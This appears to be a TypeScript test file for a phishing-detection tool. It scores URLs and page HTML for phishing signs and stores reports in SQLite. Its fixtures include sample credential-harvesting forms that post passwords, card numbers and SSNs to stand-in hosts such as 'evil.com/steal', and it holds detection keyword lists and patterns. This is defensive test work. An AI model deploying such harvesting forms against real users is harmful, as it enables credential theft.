import { describe, it } from 'node:test';
import assert from 'node:assert';
import Database from 'better-sqlite3';
import { getSchema } from '../src/db/schema.js';
import path from 'path';
import fs from 'fs';

const TEST_DB = path.join(import.meta.dirname, '..', 'data', 'test_phishkit.db');

function setupDb() {
  if (fs.existsSync(TEST_DB)) fs.unlinkSync(TEST_DB);
  const dbDir = path.dirname(TEST_DB);
  if (!fs.existsSync(dbDir)) fs.mkdirSync(dbDir, { recursive: true });
  const db = new Database(TEST_DB);
  db.pragma('journal_mode = WAL');
  db.exec(getSchema());
  return db;
}

describe('phishkit', () => {

  describe('URL analysis', () => {
    it('detects suspicious keywords in URL path', () => {
      const url = 'https://secure-login-paypal.com.verify-account.tk/login';
      const result = analyzeUrl(url);
      const keywords = result.suspiciousKeywords.filter(k => k.found).map(k => k.keyword);
      assert.ok(keywords.includes('login'));
      assert.ok(keywords.includes('secure'));
      assert.ok(keywords.includes('verify'));
    });

    it('detects typosquatting (Levenshtein distance 1)', () => {
      const url = 'https://paypa1.com/login';
      const result = analyzeUrl(url);
      assert.ok(result.typosquatScore > 0, `Expected typosquatScore > 0, got ${result.typosquatScore}`);
    });

    it('detects suspicious TLDs', () => {
      const url = 'https://login.security.tk/verify';
      const result = analyzeUrl(url);
      assert.strictEqual(result.suspiciousTld, true);
    });

    it('detects URL shorteners', () => {
      const url = 'https://bit.ly/3xZ8k1m';
      const result = analyzeUrl(url);
      assert.strictEqual(result.usesShortener, true);
    });

    it('detects raw IP addresses', () => {
      const url = 'https://195.201.22.1/login.php';
      const result = analyzeUrl(url);
      assert.strictEqual(result.usesIpInsteadOfDomain, true);
    });

    it('safe URL gets low score', () => {
      const url = 'https://github.com/makhembu/iris';
      const result = analyzeUrl(url);
      assert.ok(result.totalScore <= 0.3, `Expected low score for safe URL, got ${result.totalScore}`);
    });

    it('phishing URL gets high score', () => {
      const url = 'https://secure-paypal.com.verify-account.xyz/signin/authenticate?token=abc123';
      const result = analyzeUrl(url);
      assert.ok(result.totalScore >= 0.5, `Expected high score for phishing URL, got ${result.totalScore}`);
    });

    it('calculates entropy for long randomized paths', () => {
      const url = 'https://evil.com/a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8/login/verify';
      const result = analyzeUrl(url);
      assert.ok(result.entropyScore > 3, `Expected entropy > 3, got ${result.entropyScore}`);
    });

    it('detects brand typosquatting (distance 1)', () => {
      const url = 'https://paypa1.security-alert.tk/confirm';
      const result = analyzeUrl(url);
      assert.ok(result.typosquatScore > 0, `Expected typosquatScore > 0, got ${result.typosquatScore}`);
    });
  });

  describe('DOM analysis', () => {
    it('detects login forms with password fields', () => {
      const html = '<html><body><form action="/login"><input type="text" name="username"><input type="password" name="passwd"><button type="submit">Login</button></form></body></html>';
      const result = analyzeDom(html);
      assert.strictEqual(result.hasPasswordField, true);
      assert.strictEqual(result.hasSubmitButton, true);
    });

    it('detects suspicious input fields (credit card, SSN)', () => {
      const html = '<html><body><form><input type="text" name="creditcard"><input type="text" name="ssn"></form></body></html>';
      const result = analyzeDom(html);
      assert.ok(result.suspiciousInputs.length >= 2);
    });

    it('detects external form actions', () => {
      const html = '<html><body><form action="https://evil.com/steal"><input type="password" name="pwd"><button type="submit">Submit</button></form></body></html>';
      const result = analyzeDom(html);
      assert.strictEqual(result.externalForms, true);
    });

    it('detects missing favicon as suspicious', () => {
      const html = '<html><head><title>Test</title></head><body>Content</body></html>';
      const result = analyzeDom(html);
      assert.strictEqual(result.hasFavicon, false);
    });

    it('high score for credential harvester page', () => {
      const html = `<html><head><title>Sign In</title></head><body>
        <form action="https://harvest.xyz/capture.php">
        <input type="text" name="email">
        <input type="password" name="password">
        <input type="text" name="creditcard">
        <input type="text" name="ssn">
        <input type="submit" value="Sign In">
        </form></body></html>`;
      const result = analyzeDom(html);
      assert.ok(result.totalScore >= 0.3, `Expected DOM score >= 0.3, got ${result.totalScore}`);
    });
  });

  describe('phish score computation', () => {
    it('returns safe for very low scores', () => {
      assert.strictEqual(computePhishScore(0.05), 'safe');
    });

    it('returns suspicious for moderate scores', () => {
      assert.strictEqual(computePhishScore(0.2), 'suspicious');
    });

    it('returns likely_phishing for high scores', () => {
      assert.strictEqual(computePhishScore(0.5), 'likely_phishing');
    });

    it('returns confirmed_phishing for very high scores', () => {
      assert.strictEqual(computePhishScore(0.8), 'confirmed_phishing');
    });
  });

  describe('database schema', () => {
    it('creates reports table', () => {
      const db = setupDb();
      const tables = db.prepare("SELECT name FROM sqlite_master WHERE type='table'").all() as { name: string }[];
      assert.ok(tables.some(t => t.name === 'reports'));
      db.close();
      if (fs.existsSync(TEST_DB)) fs.unlinkSync(TEST_DB);
    });

    it('inserts and retrieves a phishing report', () => {
      const db = setupDb();
      db.prepare(`
        INSERT INTO reports (id, url, domain, status, phish_score, url_analysis, final_score, created_at, completed_at, tags)
        VALUES (?, ?, ?, 'completed', ?, ?, ?, datetime('now'), datetime('now'), ?)
      `).run('r1', 'https://evil.phish.tk/login', 'evil.phish.tk', 'likely_phishing', '{}', 0.65, '["phishing"]');

      const row = db.prepare("SELECT url, phish_score, final_score FROM reports WHERE id = 'r1'").get() as any;
      assert.strictEqual(row.url, 'https://evil.phish.tk/login');
      assert.strictEqual(row.phish_score, 'likely_phishing');
      assert.strictEqual(row.final_score, 0.65);
      db.close();
      if (fs.existsSync(TEST_DB)) fs.unlinkSync(TEST_DB);
    });
  });
});

/* Inline URL analyzer (mirror of src/analysis/url.ts logic) */
const SUSPICIOUS_KEYWORDS = ['login', 'signin', 'verify', 'account', 'update', 'confirm', 'secure', 'banking', 'paypal', 'password', 'credential', 'authenticate', 'reset', 'recover', 'validate', 'suspend', 'unlock', 'billing', 'invoice', 'webmail', 'webscr'];
const SHORTENER_DOMAINS = ['bit.ly', 'tinyurl.com', 'shorturl.at', 't.co', 'goo.gl', 'is.gd', 'cli.gs', 'ow.ly', 'buff.ly', 'tiny.cc', 'rebrand.ly', 'cutt.ly', 'shorte.st', 'adf.ly'];
const SUSPICIOUS_TLDS = ['.tk', '.ml', '.ga', '.cf', '.gq', '.xyz', '.top', '.club', '.work', '.date', '.men', '.loan', '.download', '.review', '.stream', '.trade', '.bid'];
const BRAND_DOMAINS = ['google', 'facebook', 'apple', 'microsoft', 'amazon', 'paypal', 'netflix', 'instagram', 'twitter', 'linkedin', 'dropbox', 'adobe', 'spotify', 'whatsapp', 'youtube', 'github', 'slack', 'discord', 'telegram', 'outlook'];

function extractDomain(url: string): string { try { return new URL(url).hostname.toLowerCase(); } catch { return url.toLowerCase(); } }

function levenshtein(a: string, b: string): number {
  const m = a.length, n = b.length;
  const dp = Array.from({ length: m + 1 }, () => Array(n + 1).fill(0));
  for (let i = 0; i <= m; i++) dp[i][0] = i;
  for (let j = 0; j <= n; j++) dp[0][j] = j;
  for (let i = 1; i <= m; i++) for (let j = 1; j <= n; j++)
    dp[i][j] = a[i - 1] === b[j - 1] ? dp[i - 1][j - 1] : 1 + Math.min(dp[i - 1][j], dp[i][j - 1], dp[i - 1][j - 1]);
  return dp[m][n];
}

function calculateEntropy(str: string): number {
  const freq: Record<string, number> = {};
  for (const ch of str) freq[ch] = (freq[ch] || 0) + 1;
  let entropy = 0;
  for (const ch in freq) { const p = freq[ch] / str.length; entropy -= p * Math.log2(p); }
  return entropy;
}

function analyzeUrl(url: string) {
  const domain = extractDomain(url);
  let totalScore = 0;
  const lower = url.toLowerCase();
  const suspiciousKeywords = SUSPICIOUS_KEYWORDS.map(k => ({ keyword: k, found: lower.includes(k) }));
  const keywordHits = suspiciousKeywords.filter(k => k.found).length;
  const typosquatScore = (() => {
    let score = 0;
    const base = domain.split('.')[0];
    for (const brand of BRAND_DOMAINS) {
      const dist = levenshtein(base, brand);
      if (dist === 0) return 0;
      if (dist === 1) score += 0.8;
      else if (dist <= 2) score += 0.5;
      else if (dist <= 3) score += 0.2;
    }
    if (base.includes('-') && BRAND_DOMAINS.some(b => base.includes(b))) score += 0.4;
    if (BRAND_DOMAINS.some(b => domain.split('.').slice(1).some(p => p.includes(b)))) score += 0.6;
    return Math.min(score, 1);
  })();
  const subdomainDepth = domain.split('.').length - 2;
  const usesShortener = SHORTENER_DOMAINS.some(s => domain.includes(s));
  const usesIpInsteadOfDomain = /^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$/.test(domain);
  const suspiciousTld = SUSPICIOUS_TLDS.some(t => domain.endsWith(t));
  const urlPath = url.includes('://') ? (new URL(url).pathname + new URL(url).search) : '';
  const entropyScore = calculateEntropy(urlPath || domain);
  if (keywordHits > 0) totalScore += Math.min(keywordHits * 0.15, 0.6);
  totalScore += typosquatScore * 0.5;
  totalScore += Math.min(subdomainDepth * 0.1, 0.3);
  if (usesShortener) totalScore += 0.4;
  if (usesIpInsteadOfDomain) totalScore += 0.7;
  if (suspiciousTld) totalScore += 0.3;
  if (entropyScore > 4) totalScore += 0.2;
  return { suspiciousKeywords, typosquatScore, subdomainDepth, usesShortener, usesIpInsteadOfDomain, suspiciousTld, entropyScore: Math.round(entropyScore * 100) / 100, totalScore: Math.round(totalScore * 100) / 100 };
}

function analyzeDom(html: string) {
  const lower = html.toLowerCase();
  let totalScore = 0;
  const SUSPICIOUS_INPUT_NAMES = ['password', 'passwd', 'pwd', 'creditcard', 'ccnumber', 'ssn', 'social', 'pin', 'atm', 'cvv', 'cvc', 'bankaccount', 'routing', 'securitycode'];
  const formCount = (lower.match(/<form[\s>]/g) || []).length;
  const hasPasswordField = /<input[^>]*type=["']?password["'\s>]/i.test(html);
  const hasSubmitButton = /<input[^>]*type=["']?submit["'\s>]/i.test(html) || /<button[^>]*type=["']?submit["'\s>]/i.test(html);
  const suspiciousInputs: { name: string; reason: string }[] = [];
  for (const name of SUSPICIOUS_INPUT_NAMES) {
    if (new RegExp(`name=["']?${name}["'\\s>]`, 'i').test(html)) {
      suspiciousInputs.push({ name, reason: `Asks for sensitive field: ${name}` });
      totalScore += 0.15;
    }
  }
  const externalForms = /action=["']https?:\/\/(?!.*(?:\.?current-domain))/i.test(html) && formCount > 0;
  const hasFavicon = /<link[^>]*rel=["']?icon["'\s>]/i.test(html);
  const hasTitle = /<title[^>]*>.*?<\/title>/i.test(html);
  if (hasPasswordField) totalScore += 0.3;
  if (externalForms) totalScore += 0.5;
  if (!hasFavicon) totalScore += 0.05;
  if (!hasTitle) totalScore += 0.1;
  return { hasPasswordField, hasSubmitButton, formCount, suspiciousInputs, externalForms, hasFavicon, hasTitle, totalScore: Math.round(totalScore * 100) / 100 };
}

function computePhishScore(totalScore: number): string {
  if (totalScore >= 0.7) return 'confirmed_phishing';
  if (totalScore >= 0.4) return 'likely_phishing';
  if (totalScore >= 0.15) return 'suspicious';
  return 'safe';
}
